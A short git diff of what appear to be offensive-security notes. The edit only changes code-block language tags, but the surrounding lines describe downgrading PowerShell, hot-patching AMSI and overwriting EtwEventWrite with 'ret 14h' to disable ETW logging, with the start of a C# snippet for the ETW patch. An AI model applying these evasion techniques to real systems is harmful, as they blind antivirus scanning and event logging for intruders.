@@ -113,7 +113,7 @@ powershell.exe -Version 2 # Haha get juked
 - Uninterpreted ticks.
 - Patch AMSI
 	- Hot-patching AMSI to accept anything is a valid option. Since AMSI is running with the same privileges as our process, we can just hot-patch a "don't trigger" over the "trigger" part of the binary. 
-```powershell
+```csharp
 
 # This code will need to be obfuscated.
 
@@ -169,7 +169,7 @@ ETW is split into Controllers, Providers, and Consumers.
 
 Patching ETW on-the-fly can be accomplished to avoid detection. By replacing the call to `EtwEventWrite` at its base address with a `ret 14h` we can totally negate the function call altogether. The necessary code can be found below. 
 
-```c#
+```csharp
 var ntdll = Win32.LoadLibrary("ntdll.dll");
 var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
 
